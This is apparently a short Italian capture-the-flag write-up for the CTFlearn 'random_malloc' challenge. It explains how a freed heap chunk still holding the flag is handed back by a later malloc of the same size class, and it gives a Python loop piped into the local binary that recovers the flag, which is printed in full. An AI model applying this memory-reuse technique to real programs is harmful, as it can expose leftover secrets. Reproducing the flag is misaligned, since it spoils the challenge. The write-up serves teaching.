# random_malloc - PWN (Heap memory reuse)

**Flag:** `CTFlearn{h34p_m3m0ry_r3us1ng}`

## Analisi
`load_flag` scrive `"Your flag is here: <flag>"` in un chunk di dimensione casuale (64-1003), poi lo `free`. Poi in loop: legge una dimensione, fa `malloc(size)` e stampa i primi 69 byte del chunk **senza azzerarlo**. Se richiediamo una `malloc` della **stessa classe di dimensione** del chunk liberato, riotteniamo quel chunk con ancora dentro i dati della flag.

## Soluzione - passo per passo
La dimensione originale e' casuale, quindi proviamo tutte le dimensioni da 64 a 1003 nello stesso processo (il loop resta aperto): una corrispondera' alla classe giusta e ristampera' la flag.

1. Entra nella cartella:
   ```
   cd random_malloc
   ```
2. Invia tutte le dimensioni e filtra la flag:
   ```
   python3 -c "
   import sys
   for s in range(64,1004): sys.stdout.write(str(s)+'\n')
   " | ./task 2>/dev/null | grep -a CTFlearn | head -1
   ```
   Output --> `...e: CTFlearn{h34p_m3m0ry_r3us1ng}`


